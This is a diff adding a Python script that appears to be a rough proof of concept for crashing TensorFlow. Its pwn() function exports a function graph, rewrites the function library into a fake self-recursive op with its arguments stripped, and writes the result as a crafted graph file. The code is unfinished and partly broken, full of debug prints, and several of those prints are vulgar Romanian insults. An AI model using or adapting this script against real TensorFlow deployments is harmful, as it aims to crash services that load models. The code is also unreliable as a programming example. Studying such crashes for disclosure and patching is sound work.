@@ -1,0 +1,150 @@
+#import tensorflow as tf
+import tensorflow.compat.v1 as tf
+tf.disable_v2_behavior()
+from google.protobuf import json_format
+from functools import reduce
+from collections import defaultdict
+import json
+
+# define a simple model 
+def build_model(): 
+    inputs = tf.keras.Input(shape=(2,), name='inputs') 
+    x = tf.keras.layers.Dense(4, activation='relu', name='dense1')(inputs) 
+    outputs = tf.keras.layers.Dense(1, name='outputs')(x) 
+    model = tf.keras.Model(inputs=inputs, outputs=outputs) 
+    return model
+
+def simple_relu(x):
+  if tf.greater(x, 0):
+    return x#+simple_relu(x)
+  else:
+      return 0
+
+
+
+def pwn():
+
+# Using `tf.function` makes `tf_simple_relu` a `PolymorphicFunction` that wraps
+# `simple_relu`.
+#protoc --decode_raw < test.pb
+  with tf.Session() as sess:
+    tf_simple_relu = tf.function(simple_relu)
+    tf.train.write_graph(tf_simple_relu.get_concrete_function(tf.constant(1)).graph.as_graph_def(), ".", "test.pb", False)
+    
+  #print(tf.autograph.to_code(simple_relu))
+    output_graph = (tf_simple_relu.get_concrete_function(tf.constant(1)).graph.as_graph_def())
+    print(type(output_graph))
+    json_string = json_format.MessageToJson(output_graph)
+    json_format.Parse(json_string, output_graph)
+    print((json_string))
+    res = json.loads(json_string)
+    print(type(res))
+    to_pars = None
+    ctr = 0
+    y = None
+    for k in res:
+      if ctr == 0:
+        x = json.dumps(res[k])
+        x = json.dumps(res[k])
+        to_pars = json.loads(x)
+        res_dict = {}
+        print("debug1")
+        print(to_pars)
+        print(type(to_pars))
+        print("debug2")
+        #print(to_pars[0])
+        for i in to_pars:
+          print(i)
+          pass
+      else:
+        print(type(res[k]))
+        print(str(ctr)+"aici")
+        x = json.dumps(res[k])
+        y = json.loads(x)
+        ctr_hack = 1
+        #print(dir(y))
+        if(ctr != 2):
+          #print("in debug 1 ")
+          #print(y)
+          #print("stop debug 1")
+          print("inceput")
+          for l in y:
+            print("212.ma sugi")
+            #print(y)
+            for q in (y[l]):
+              print("ma sugi")
+              #print(y[l])
+              for k,v in q.items():
+                #print(k)
+                if k == "signature":
+                  print(v)
+                  v['name'] = "SomeOp"
+                  v["description"] = "Self recursive op"
+                  del v['inputArg']
+                  del v['outputArg']
+                  print("aici sugi pula\n")
+                  print(k,"=>",v) 
+                if k == "nodeDef":
+                  print(q)
+                  v = {'name':"SomeOp","description":"Self recursive op"}
+                  q["nodeDef"] = {"name":str(ctr_hack),"op":"SomeOp","name":str(ctr_hack),"op":"SomeOp"}
+                  print("Craiova aici sugi pula\n")
+                  print(k,"=>",v) 
+                  print(q)
+                #print(k)
+                  ctr_hack +=1 
+          print("final")
+          print(y)
+          #del y['ret']
+          #del y['argAttr']
+          for k in y['function']:
+            del k['ret']
+            del k['argAttr']
+          print("final2")
+          print(y)
+          data_dict = defaultdict(list)
+
+
+          aleaotoriu = 0
+          for key,value in y.items():
+            for z in y[key]:
+              if(aleaotoriu == 0 ):
+                data_dict['function'] = {'signature':z['signature']}
+              data_dict['nodeDef'].append(z['nodeDef'])
+              aleaotoriu+=1
+          print(data_dict)
+      ctr +=1
+    #print(data_dict)
+    dictz = dict(data_dict.items())
+    #print(dictz)
+   # print(type(res['library']['function'][1:]))
+    res['library']['function'][1:]= dictz.items()
+    print(res)
+
+    """
+    dir(tf.compat.v1.get_default_graph())
+    print('\n### check nodes')
+    for n in tf.get_default_graph().as_graph_def().node:
+      print(n.name)
+    for n in tf.get_default_graph().as_graph_def().create_op:
+      print(n.name)
+    """
+    #tf.reset_default_graph()
+
+    #for op in output_graph.get_operations():
+      #print(str(op.name), op.inputs)
+
+   # model = build_model() 
+   # model.save('crash_2022_23591')
+
+"""
+with tf.io.gfile.GFile('test.pb', 'rb') as f:
+  graph_def = tf.compat.v1.GraphDef()
+  print("aiciaaaaaaaaaaaaaa")
+  print(graph_def)
+  graph_def.ParseFromString(f.read())
+  #tf.saved_model.load('/tmp/saved_model')
+"""
+
+if __name__ == "__main__":
+  pwn()
